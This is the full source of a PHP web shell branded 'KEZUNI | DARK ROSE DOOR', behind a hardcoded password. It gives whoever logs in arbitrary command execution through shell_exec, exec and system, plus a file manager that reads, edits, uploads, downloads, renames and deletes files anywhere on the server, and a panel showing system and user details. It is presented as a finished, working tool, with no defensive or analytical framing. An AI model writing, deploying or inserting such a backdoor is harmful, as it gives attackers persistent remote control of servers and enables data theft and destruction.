<?php
/**
 * KEZUNI | DARK ROSE DOOR - Working Final Version
 * No JSON errors, all features working
 */

session_start();
error_reporting(0);

$PASSWORD = "kezuni2026";

// Check authentication
$logged_in = false;
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    $logged_in = true;
}

// Handle login
if (isset($_POST['password'])) {
    if ($_POST['password'] === $PASSWORD) {
        $_SESSION['logged_in'] = true;
        $logged_in = true;
        if (isset($_POST['ajax'])) {
            echo json_encode(['success' => true]);
            exit;
        }
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        if (isset($_POST['ajax'])) {
            echo json_encode(['success' => false, 'error' => 'Invalid password']);
            exit;
        }
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// API Handler - Using POST for better compatibility
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    header('Content-Type: application/json');
    
    if (!$logged_in) {
        echo json_encode(['error' => 'Authentication required']);
        exit;
    }
    
    $action = $_POST['action'] ?? '';
    
    if ($action === 'execute') {
        $cmd = $_POST['cmd'] ?? '';
        $output = execute_command($cmd);
        echo json_encode(['success' => true, 'output' => $output]);
        exit;
    }
    
    elseif ($action === 'list') {
        $path = $_POST['path'] ?? getcwd();
        $result = list_directory($path);
        echo json_encode($result);
        exit;
    }
    
    elseif ($action === 'read') {
        $file = $_POST['file'] ?? '';
        if (file_exists($file) && is_file($file)) {
            $content = file_get_contents($file);
            echo json_encode(['success' => true, 'content' => $content]);
        } else {
            echo json_encode(['success' => false, 'error' => 'File not found']);
        }
        exit;
    }
    
    elseif ($action === 'save') {
        $file = $_POST['file'] ?? '';
        $content = $_POST['content'] ?? '';
        if (file_put_contents($file, $content) !== false) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Cannot write file']);
        }
        exit;
    }
    
    elseif ($action === 'delete') {
        $path = $_POST['path'] ?? '';
        if (is_dir($path)) {
            delete_directory($path);
        } else {
            @unlink($path);
        }
        echo json_encode(['success' => true]);
        exit;
    }
    
    elseif ($action === 'rename') {
        $old = $_POST['old'] ?? '';
        $new = $_POST['new'] ?? '';
        $new_path = dirname($old) . '/' . $new;
        $result = @rename($old, $new_path);
        echo json_encode(['success' => $result]);
        exit;
    }
    
    elseif ($action === 'mkdir') {
        $path = $_POST['path'] ?? '';
        @mkdir($path, 0755, true);
        echo json_encode(['success' => true]);
        exit;
    }
    
    elseif ($action === 'touch') {
        $path = $_POST['path'] ?? '';
        @file_put_contents($path, '');
        echo json_encode(['success' => true]);
        exit;
    }
    
    elseif ($action === 'info') {
        $info = get_system_info();
        echo json_encode(['success' => true, 'info' => $info]);
        exit;
    }
    
    echo json_encode(['error' => 'Unknown action']);
    exit;
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    if (!$logged_in) {
        die('Not logged in');
    }
    $path = $_POST['path'] ?? getcwd();
    $target = rtrim($path, '/') . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false]);
    }
    exit;
}

// Handle download
if (isset($_GET['download']) && $logged_in) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
    }
    exit;
}

// Show login page
if (!$logged_in) {
    show_login();
    exit;
}

// Show main interface
show_interface();

// ==================== FUNCTIONS ====================

function execute_command($cmd) {
    $output = '';
    if (function_exists('shell_exec')) {
        $output = @shell_exec($cmd . ' 2>&1');
    }
    if (empty($output) && function_exists('exec')) {
        @exec($cmd . ' 2>&1', $output_array);
        $output = implode("\n", $output_array);
    }
    if (empty($output) && function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        $output = ob_get_clean();
    }
    return $output ?: '(No output)';
}

function list_directory($path) {
    $path = realpath($path);
    if (!$path || !is_dir($path)) {
        return ['success' => false, 'error' => 'Invalid directory'];
    }
    
    $items = @scandir($path);
    if (!$items) {
        return ['success' => false, 'error' => 'Cannot read directory'];
    }
    
    $files = [];
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $fullpath = $path . '/' . $item;
        $is_dir = is_dir($fullpath);
        $files[] = [
            'name' => $item,
            'path' => $fullpath,
            'type' => $is_dir ? 'dir' : 'file',
            'size' => $is_dir ? 0 : filesize($fullpath),
            'size_human' => $is_dir ? '-' : format_bytes(filesize($fullpath)),
            'perms' => substr(sprintf('%o', fileperms($fullpath)), -4)
        ];
    }
    
    usort($files, function($a, $b) {
        if ($a['type'] === $b['type']) return strcmp($a['name'], $b['name']);
        return ($a['type'] === 'dir') ? -1 : 1;
    });
    
    return [
        'success' => true,
        'current_dir' => $path,
        'parent_dir' => dirname($path),
        'files' => $files
    ];
}

function get_system_info() {
    return [
        'os' => php_uname(),
        'hostname' => gethostname(),
        'php_version' => phpversion(),
        'user' => execute_command('whoami'),
        'current_dir' => getcwd(),
        'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown'
    ];
}

function delete_directory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        delete_directory($dir . '/' . $item);
    }
    return rmdir($dir);
}

function format_bytes($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function show_login() {
    ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>KEZUNI | DARK ROSE DOOR</title>
    <style>
        body {
            background: #0a0a0a;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: #1a1a1a;
            border: 2px solid #ff1493;
            padding: 40px;
            border-radius: 10px;
            width: 350px;
        }
        .login-box h1 {
            color: #ff1493;
            text-align: center;
            margin-bottom: 30px;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #ff1493;
            margin: 10px 0;
            font-family: monospace;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background: #ff1493;
            color: #000;
            border: none;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>KEZUNI | DARK ROSE DOOR</h1>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" autofocus>
            <button type="submit">LOGIN</button>
        </form>
    </div>
</body>
</html>
    <?php
}

function show_interface() {
    $current_dir = getcwd();
    ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>KEZUNI | DARK ROSE DOOR</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: monospace;
            font-size: 13px;
            padding: 20px;
        }
        .header {
            background: #1a1a1a;
            border: 1px solid #ff1493;
            padding: 15px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 { color: #ff1493; font-size: 18px; }
        .header a { color: #ff1493; text-decoration: none; }
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .tab {
            background: #1a1a1a;
            padding: 10px 20px;
            cursor: pointer;
            border: 1px solid #333;
            border-radius: 5px;
        }
        .tab:hover { border-color: #ff1493; }
        .tab.active {
            background: #ff1493;
            color: #000;
            font-weight: bold;
        }
        .panel { display: none; }
        .panel.active { display: block; }
        .box {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        .input-group input {
            flex: 1;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            padding: 10px;
            font-family: monospace;
        }
        button {
            background: #ff1493;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
            border-radius: 3px;
        }
        button:hover { opacity: 0.8; }
        .output {
            background: #0a0a0a;
            border: 1px solid #333;
            padding: 15px;
            max-height: 400px;
            overflow: auto;
            white-space: pre-wrap;
            font-family: monospace;
            font-size: 12px;
        }
        .file-list {
            background: #0a0a0a;
            border: 1px solid #333;
            max-height: 500px;
            overflow: auto;
        }
        .file-item {
            padding: 8px 12px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .file-item:hover { background: #1a1a1a; }
        .file-item.dir { color: #ff1493; cursor: pointer; }
        .file-item.file { color: #00ff00; }
        .file-name { flex: 1; cursor: pointer; }
        .file-size { margin-left: 20px; color: #666; font-size: 11px; }
        .file-actions button {
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            margin-left: 10px;
            font-size: 12px;
        }
        .file-actions button:hover { color: #ff1493; }
        .path-bar {
            background: #1a1a1a;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            word-break: break-all;
        }
        .toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        .toolbar input {
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            padding: 8px;
            font-family: monospace;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 1000;
        }
        .modal-content {
            background: #1a1a1a;
            margin: 50px auto;
            width: 90%;
            max-width: 1000px;
            border: 2px solid #ff1493;
            border-radius: 10px;
        }
        .modal-header {
            padding: 15px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
        }
        .modal-body { padding: 15px; }
        .modal-footer { padding: 15px; border-top: 1px solid #333; }
        textarea {
            width: 100%;
            height: 400px;
            background: #0a0a0a;
            color: #00ff00;
            border: 1px solid #333;
            padding: 10px;
            font-family: monospace;
            font-size: 13px;
        }
        .close {
            color: #ff1493;
            font-size: 24px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>KEZUNI | DARK ROSE DOOR</h1>
        <a href="?logout=1">LOGOUT</a>
    </div>
    
    <div class="tabs">
        <div class="tab active" onclick="showPanel('exec')">COMMAND</div>
        <div class="tab" onclick="showPanel('files')">FILES</div>
        <div class="tab" onclick="showPanel('info')">INFO</div>
    </div>
    
    <div id="panel-exec" class="panel active">
        <div class="box">
            <div class="input-group">
                <input type="text" id="cmd" placeholder="Enter command..." onkeypress="if(event.keyCode==13) execCommand()">
                <button onclick="execCommand()">EXECUTE</button>
            </div>
            <div id="cmd-output" class="output">Ready...</div>
        </div>
    </div>
    
    <div id="panel-files" class="panel">
        <div class="toolbar">
            <input type="text" id="filepath" style="flex:1;" value="<?php echo $current_dir; ?>">
            <button onclick="listFiles()">LIST</button>
            <button onclick="createFile()">NEW FILE</button>
            <button onclick="createDir()">NEW DIR</button>
        </div>
        <div class="path-bar" id="current-path"></div>
        <div id="file-list" class="file-list">Loading...</div>
        <div class="toolbar" style="margin-top: 15px;">
            <input type="file" id="upload-file">
            <button onclick="uploadFile()">UPLOAD</button>
        </div>
    </div>
    
    <div id="panel-info" class="panel">
        <div id="sys-info" class="output">Loading...</div>
    </div>
    
    <!-- Editor Modal -->
    <div id="editor-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <span>EDITING: <span id="edit-filename"></span></span>
                <span class="close" onclick="closeEditor()">&times;</span>
            </div>
            <div class="modal-body">
                <textarea id="editor-content"></textarea>
            </div>
            <div class="modal-footer">
                <button onclick="saveFile()">SAVE</button>
                <button onclick="closeEditor()">CANCEL</button>
            </div>
        </div>
    </div>
    
    <!-- Rename Modal -->
    <div id="rename-modal" class="modal">
        <div class="modal-content" style="max-width: 400px;">
            <div class="modal-header">
                <span>RENAME: <span id="rename-filename"></span></span>
                <span class="close" onclick="closeRename()">&times;</span>
            </div>
            <div class="modal-body">
                <input type="text" id="rename-new-name" style="width: 100%; padding: 10px;" placeholder="New name">
            </div>
            <div class="modal-footer">
                <button onclick="confirmRename()">RENAME</button>
                <button onclick="closeRename()">CANCEL</button>
            </div>
        </div>
    </div>
    
    <script>
        let currentDir = '<?php echo $current_dir; ?>';
        let currentEditFile = '';
        let currentRenamePath = '';
        
        function showPanel(panel) {
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.getElementById('panel-' + panel).classList.add('active');
            event.target.classList.add('active');
            if (panel === 'files') listFiles();
            if (panel === 'info') loadInfo();
        }
        
        async function apiCall(action, data) {
            let formData = new FormData();
            formData.append('action', action);
            for (let key in data) {
                formData.append(key, data[key]);
            }
            
            let response = await fetch('', {
                method: 'POST',
                headers: { 'X-Requested-With': 'XMLHttpRequest' },
                body: formData
            });
            return await response.json();
        }
        
        async function execCommand() {
            let cmd = document.getElementById('cmd').value;
            if (!cmd) return;
            
            let outputDiv = document.getElementById('cmd-output');
            outputDiv.innerHTML = 'Executing...';
            
            let result = await apiCall('execute', { cmd: cmd });
            outputDiv.innerHTML = '<pre>' + (result.output || result.error || 'No output') + '</pre>';
        }
        
        async function listFiles() {
            let path = document.getElementById('filepath').value;
            currentDir = path;
            
            let result = await apiCall('list', { path: path });
            
            if (result.success) {
                document.getElementById('current-path').innerHTML = 'Current: ' + result.current_dir;
                currentDir = result.current_dir;
                document.getElementById('filepath').value = currentDir;
                
                let html = '';
                if (result.parent_dir !== result.current_dir) {
                    html += `<div class="file-item dir">
                        <span class="file-name" onclick="goToPath('${result.parent_dir}')">.. (Parent)</span>
                        <span class="file-size"></span>
                        <span class="file-actions"></span>
                    </div>`;
                }
                
                for (let file of result.files) {
                    let sizeInfo = file.type === 'dir' ? '-' : file.size_human;
                    html += `<div class="file-item ${file.type}">
                        <span class="file-name" onclick="handleClick('${file.path}', '${file.type}')">${escapeHtml(file.name)}</span>
                        <span class="file-size">${sizeInfo} | ${file.perms}</span>
                        <span class="file-actions">
                            ${file.type === 'file' ? `<button onclick="event.stopPropagation();editFile('${file.path}')">EDIT</button>` : ''}
                            <button onclick="event.stopPropagation();showRename('${file.path}', '${escapeHtml(file.name)}')">RENAME</button>
                            <button onclick="event.stopPropagation();deleteItem('${file.path}')">DELETE</button>
                            ${file.type === 'file' ? `<button onclick="event.stopPropagation();downloadFile('${file.path}')">DOWNLOAD</button>` : ''}
                        </span>
                    </div>`;
                }
                
                document.getElementById('file-list').innerHTML = html || '<div class="file-item">Empty directory</div>';
            } else {
                document.getElementById('file-list').innerHTML = '<div class="file-item" style="color:#ff3333">Error: ' + result.error + '</div>';
            }
        }
        
        function goToPath(path) {
            document.getElementById('filepath').value = path;
            listFiles();
        }
        
        function handleClick(path, type) {
            if (type === 'dir') {
                document.getElementById('filepath').value = path;
                listFiles();
            } else {
                editFile(path);
            }
        }
        
        async function editFile(path) {
            currentEditFile = path;
            document.getElementById('edit-filename').innerText = path;
            document.getElementById('editor-modal').style.display = 'block';
            
            let result = await apiCall('read', { file: path });
            if (result.success) {
                document.getElementById('editor-content').value = result.content;
            } else {
                document.getElementById('editor-content').value = 'Error: ' + result.error;
            }
        }
        
        async function saveFile() {
            let content = document.getElementById('editor-content').value;
            let result = await apiCall('save', { file: currentEditFile, content: content });
            if (result.success) {
                alert('File saved!');
                closeEditor();
                listFiles();
            } else {
                alert('Save failed: ' + result.error);
            }
        }
        
        function closeEditor() {
            document.getElementById('editor-modal').style.display = 'none';
        }
        
        function showRename(path, name) {
            currentRenamePath = path;
            document.getElementById('rename-filename').innerText = name;
            document.getElementById('rename-new-name').value = name;
            document.getElementById('rename-modal').style.display = 'block';
        }
        
        async function confirmRename() {
            let newName = document.getElementById('rename-new-name').value;
            if (!newName) return;
            
            let result = await apiCall('rename', { old: currentRenamePath, new: newName });
            if (result.success) {
                closeRename();
                listFiles();
            } else {
                alert('Rename failed');
            }
        }
        
        function closeRename() {
            document.getElementById('rename-modal').style.display = 'none';
        }
        
        async function deleteItem(path) {
            if (confirm('Delete ' + path + '?')) {
                await apiCall('delete', { path: path });
                listFiles();
            }
        }
        
        function downloadFile(path) {
            window.location.href = '?download=' + encodeURIComponent(path);
        }
        
        async function uploadFile() {
            let input = document.getElementById('upload-file');
            let file = input.files[0];
            if (!file) return;
            
            let formData = new FormData();
            formData.append('file', file);
            formData.append('path', currentDir);
            
            let response = await fetch('', { method: 'POST', body: formData });
            let result = await response.json();
            
            if (result.success) {
                alert('Uploaded!');
                listFiles();
                input.value = '';
            } else {
                alert('Upload failed');
            }
        }
        
        async function createFile() {
            let name = prompt('File name:');
            if (name) {
                let path = currentDir + '/' + name;
                await apiCall('touch', { path: path });
                editFile(path);
            }
        }
        
        async function createDir() {
            let name = prompt('Directory name:');
            if (name) {
                let path = currentDir + '/' + name;
                await apiCall('mkdir', { path: path });
                listFiles();
            }
        }
        
        async function loadInfo() {
            let result = await apiCall('info', {});
            if (result.success) {
                document.getElementById('sys-info').innerHTML = '<pre>' + JSON.stringify(result.info, null, 2) + '</pre>';
            }
        }
        
        function escapeHtml(text) {
            let div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Initial load
        listFiles();
        
        document.getElementById('cmd').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') execCommand();
        });
    </script>
</body>
</html>
    <?php
}
?>